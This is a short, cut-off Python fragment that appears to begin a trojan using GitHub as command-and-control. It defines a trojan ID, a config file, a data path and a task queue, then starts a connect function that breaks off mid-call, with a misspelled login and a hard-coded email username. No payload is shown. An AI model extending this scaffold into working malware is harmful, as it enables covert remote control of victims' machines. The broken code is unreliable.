import json
import base64
import sys
import time
import imp
import random
import threading
import queue
import os

from github3 import login

trojan_id = "abc"

trojan_config = "{}.json".format(trojan_id)
data_path = "data/%s/" % trojan_id
trojan_modules = []
configured = False
task_queue = queue.Queue()

def connect_to_github():
    gh = loging(username="tew6@pct.edu",password
